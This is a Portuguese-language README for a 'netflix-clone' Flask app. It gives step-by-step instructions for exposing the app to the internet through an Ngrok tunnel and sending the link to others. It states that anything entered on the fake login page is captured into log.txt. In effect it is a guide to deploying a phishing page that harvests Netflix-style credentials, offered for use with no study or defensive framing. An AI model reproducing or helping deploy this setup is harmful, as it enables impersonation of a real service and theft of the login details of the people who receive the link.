# netflix-clone
## Instalando o Ngrok

Para que a aplicação Flask seja acessível por outros dispositivos além do localhost, é necessário instalar e usar o Ngrok. 

O Ngrok é uma ferramenta que permite criar um túnel seguro para expor um servidor local na internet, permitindo que ele seja acessível por outros dispositivos. 
[👉Baixe clicando aqui👈](https://ngrok.com/download)
### Como usar?

Para por o netflix-clone no ar, siga os seguintes passos:

1. Certifique-se de que o Python e o Flask estão instalados no seu computador.
2. Execute o arquivo `app.py` com o comando `python app.py`.
3. Em um terminal separado, execute o comando `ngrok http 5000`. Isso irá criar um túnel para o seu servidor Flask na porta 5000.
4. Copie o link fornecido pelo Ngrok (algo como `letras-e-numeros-aleatórios.sa.ngrok.io`) e envie-o para quem desejar acessar a aplicação a partir de outro dispositivo.
5. Qualquer informação que for capturada na página de login será atualizada no arquivo `log.txt`.

Certifique-se de ter o Ngrok instalado para tornar a aplicação acessível por outros dispositivos.
